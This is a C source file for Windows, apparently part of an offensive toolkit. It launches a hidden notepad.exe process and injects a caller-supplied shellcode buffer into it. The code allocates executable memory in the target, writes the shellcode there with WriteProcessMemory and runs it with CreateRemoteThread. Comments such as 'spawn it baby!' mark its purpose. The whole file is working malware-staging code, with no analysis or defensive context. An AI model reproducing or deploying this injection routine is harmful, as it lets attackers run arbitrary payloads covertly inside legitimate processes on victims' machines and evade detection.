#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include "inject.h"

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject(char * buffer, int length) {
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	HANDLE hModule    = NULL;
	HANDLE hProcess   = NULL;
	DWORD  dwLength   = 0;
	char lbuffer[1024];
	unsigned int lsize;
	char cmdbuff[1024];
	void * ptr;
	int x;
	int wrote;

	/* reset some stuff */
	ZeroMemory( &si, sizeof(si) );
	si.cb = sizeof(si);
	ZeroMemory( &pi, sizeof(pi) );

	/* start a process */
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	si.hStdOutput = NULL;
	si.hStdError = NULL;
	si.hStdInput = NULL;

	/* resolve windir? */
	lsize = GetEnvironmentVariableA("windir", lbuffer, 1024);

	/* setup our path? */
		/* try: \System32\notepad.exe, \Sysnative\notepad.exe */
	_snprintf(cmdbuff, 1024, "%s\\System32\\notepad.exe", lbuffer);

	/* spawn it baby! */
	if (!CreateProcessA(NULL, cmdbuff, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		return;

	hProcess = pi.hProcess;
	if( !hProcess )
		return;

	inject_process(hProcess, buffer, length);
}

/* inject some shellcode... enclosed stuff is the shellcode y0 */
void inject_process(HANDLE hProcess, char * buffer, int length) {
	void * ptr;
	int wrote;

	/* allocate memory in our process */
	ptr = (char *)VirtualAllocEx(hProcess, 0, length + 128, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	/* write our shellcode to the process */
	WriteProcessMemory(hProcess, ptr, buffer, length, (SIZE_T *)&wrote);
	if (wrote != length)
		return;

	/* create a thread in the process */
	CreateRemoteThread(hProcess, NULL, 0, ptr, NULL, 0, NULL);
}

